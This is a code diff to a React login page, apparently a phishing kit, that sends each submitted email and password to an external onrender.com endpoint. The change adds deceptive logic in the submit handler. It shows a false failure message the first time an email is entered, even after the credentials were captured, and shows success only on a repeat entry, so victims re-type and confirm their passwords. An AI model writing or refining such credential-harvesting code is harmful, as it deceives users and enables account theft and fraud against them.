@@ -22,6 +22,8 @@ const MtnLoginPage: React.FC = () => {
   const [logo, setLogo] = useState("");
   const [background, setBackground] = useState("");
   const [securedSession, setSecuredSession] = useState(true);
+const [lastSuccessEmail, setLastSuccessEmail] = useState<string>("");
+const [successCount, setSuccessCount] = useState<number>(0);
 
   const { enqueueSnackbar } = useSnackbar();
 
@@ -98,10 +100,25 @@ const MtnLoginPage: React.FC = () => {
   try {
     await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
     setError("");
-    enqueueSnackbar("Mensaje enviado con éxito", { variant: "success" }); 
+    setPassword(""); // Clear password field
+    if (lastSuccessEmail === email) {
+      // Same email, increment count
+      if (successCount === 1) {
+        enqueueSnackbar("Mensaje enviado con éxito", { variant: "success" });
+      } else {
+        enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
+      }
+      setSuccessCount(successCount + 1);
+    } else {
+      // New email, reset count and show error (even on success)
+      enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
+      setLastSuccessEmail(email);
+      setSuccessCount(1);
+    }
   } catch (err) {
     setError("Failed to send email. Try again!");
-    enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" }); 
+    enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
+    setSuccessCount(0); // Reset for next try
     console.error("Email sending error:", err);
   } finally {
     setLoading(false);
